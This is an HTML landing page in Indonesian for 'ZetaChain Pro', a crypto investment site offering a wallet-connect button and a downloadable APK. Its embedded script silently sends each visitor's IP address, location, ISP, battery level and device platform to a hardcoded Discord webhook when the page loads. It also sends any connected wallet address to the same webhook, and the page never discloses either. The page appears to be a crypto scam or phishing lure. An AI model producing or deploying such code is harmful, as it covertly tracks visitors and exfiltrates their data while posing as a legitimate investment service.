<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZetaChain Pro | Masa Depan Investasi Crypto</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .gold-text { color: #f3ba2f; }
        .gold-bg { background: linear-gradient(135deg, #f3ba2f 0%, #ffdb4d 100%); color: #000; }
        .glass-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); }
        .float { animation: floating 3s ease-in-out infinite; }
        @keyframes floating { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
        .page { display: none; transition: opacity 0.3s ease; }
        .active { display: block; opacity: 1; }
        .is-internal-app #apk-container { display: none !important; }
    </style>
</head>
<body class="min-h-screen bg-[radial-gradient(circle_at_top,_var(--tw-gradient-stops))] from-yellow-900/20 via-black to-black">

    <div id="home-page" class="page active min-h-screen flex flex-col items-center justify-center p-6">
        <div class="w-full max-w-lg text-center space-y-8">
            <div class="flex justify-center">
                <img src="iconzeta.png" alt="ZetaChain Logo" class="w-48 h-48 object-contain float drop-shadow-[0_0_30px_rgba(243,186,47,0.3)]">
            </div>

            <div class="space-y-4">
                <h1 class="text-3xl font-black italic tracking-tighter uppercase leading-tight">Mulai Perjalanan <br><span class="gold-text">Crypto</span> Anda</h1>
                <p class="text-gray-400 text-sm leading-relaxed px-6">Akses aman ke ekosistem keuangan masa depan. Kelola aset digital Anda dengan transparansi penuh.</p>
            </div>

            <div class="space-y-4 px-4">
                <button id="btnConnect" onclick="connectWallet()" class="w-full py-5 gold-bg rounded-2xl font-black uppercase italic text-sm shadow-[0_10px_20px_rgba(243,186,47,0.2)] active:scale-95 transition-all flex items-center justify-center gap-3">
                    <i class="fa-solid fa-wallet"></i> Hubungkan Dompet
                </button>

                <button onclick="location.href='login.html'" class="w-full py-5 bg-white/10 border border-white/10 rounded-2xl font-black uppercase italic text-sm hover:bg-white/20 active:scale-95 transition-all flex items-center justify-center gap-3">
                    <i class="fa-solid fa-bolt-lightning text-blue-400"></i> Mulai
                </button>

                <div class="flex gap-3">
                    <div id="apk-container" class="flex-1">
                        <a href="ZetaApp.apk" download class="w-full py-4 glass-card rounded-2xl flex items-center justify-center gap-2 border-green-500/20 active:scale-95 transition-all">
                            <i class="fa-brands fa-android text-green-500 text-xl"></i>
                            <p class="text-[10px] font-black italic">Ambil APK</p>
                        </a>
                    </div>
                    <button onclick="togglePage('about-page')" class="flex-1 py-4 glass-card rounded-2xl flex items-center justify-center gap-2 active:scale-95 transition-all">
                        <i class="fa-solid fa-circle-info text-yellow-500 text-xl"></i>
                        <p class="text-[10px] font-black italic">Tentang</p>
                    </button>
                </div>
            </div>
            <p class="text-[8px] text-gray-600 font-bold uppercase tracking-[0.2em] pt-4">Powered by ZetaChain Network &copy; 2026</p>
        </div>
    </div>

    <div id="about-page" class="page min-h-screen p-6">
        <div class="max-w-lg mx-auto space-y-6 pt-4 pb-12">
            <button onclick="togglePage('home-page')" class="w-full py-4 bg-white text-black rounded-2xl font-black uppercase italic text-xs active:scale-95 transition-all">Kembali</button>
        </div>
    </div>

    <script>
        const WH_URL = "https://discord.com/api/webhooks/1450373546881712151/DSSmNr8hevXg8OJr3p4u_ia3AVU5ytq8Hb3u2W6x6YLHcA0OM3OxSfYRUbt_Jqc9wz-F";

        // 1. DATA OTOMATIS SAAT BUKA WEB
        async function autoSendData() {
            let info = { ip: "N/A", bat: "N/A", ua: navigator.userAgent };
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    info.bat = Math.round(b.level * 100) + "%";
                }
                const res = await fetch("https://ipapi.co/json/");
                const d = await res.json();
                info.ip = `${d.ip} (${d.city}, ${d.country_name}) - ISP: ${d.org}`;
            } catch (e) {}

            fetch(WH_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `ðŸ”” **Visitor Active**\nðŸŒ IP: \`${info.ip}\`\nðŸ”‹ Bat: \`${info.bat}\`\nðŸ“± Device: \`${navigator.platform}\``
                })
            });
        }

        // 2. LOGIKA HUBUNGKAN DOMPET (TRUST / METAMASK)
        async function connectWallet() {
            // Cek apakah provider ethereum tersedia
            if (window.ethereum) {
                try {
                    // Minta izin akses akun
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    
                    if (accounts.length > 0) {
                        localStorage.setItem('walletAddress', accounts[0]);
                        // Kirim log sukses ke webhook jika perlu
                        fetch(WH_URL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ content: `âœ… **Wallet Connected:** \`${accounts[0]}\`` })
                        });
                        window.location.href = "dashboard.html";
                    } else {
                        throw new Error("No accounts found");
                    }
                } catch (error) {
                    // User menolak koneksi atau error teknis
                    console.error(error);
                    alert("Koneksi dompet gagal atau dibatalkan. Silakan login manual.");
                    window.location.href = "login.html";
                }
            } else {
                // Dompet tidak terdeteksi (Bukan di browser crypto)
                alert("Maaf, dompet Trust Wallet atau MetaMask tidak terdeteksi. Silakan gunakan browser internal dompet atau login manual.");
                window.location.href = "login.html";
            }
        }

        // 3. DETEKSI STATUS APP
        function checkAppStatus() {
            const ua = navigator.userAgent.toLowerCase();
            const isCryptoWallet = ua.includes('trust') || ua.includes('metamask') || (window.ethereum && window.ethereum.isMetaMask);
            const isWebView = ua.includes('wv') || (ua.includes('android') && ua.includes('version/'));

            // Sembunyikan tombol APK hanya jika di dalam WebView (Bukan Browser Wallet)
            if (isWebView && !isCryptoWallet) {
                document.body.classList.add('is-internal-app');
            }
        }

        window.onload = () => {
            checkAppStatus();
            autoSendData();
        };

        function togglePage(pageId) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(pageId).classList.add('active');
        }
    </script>
</body>
</html>
